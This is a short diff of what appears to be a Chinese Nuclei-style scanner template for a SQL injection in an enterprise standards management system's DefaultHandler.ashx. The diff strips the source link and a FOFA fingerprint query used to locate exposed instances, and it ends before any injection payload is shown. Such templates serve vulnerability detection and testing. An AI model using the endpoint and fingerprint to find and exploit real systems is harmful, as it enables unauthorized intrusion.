@@ -3,12 +3,8 @@ info:
   name: 润申信息企业标准化管理系统 DefaultHandler SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ugut4fzoz5uzfe4g'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ugut4fzoz5uzfe4g
-    fofa: body="PDCA/js/_publicCom.js"
 http:
 - raw:
   - 'POST /ashx/DefaultHandler.ashx HTTP/1.1
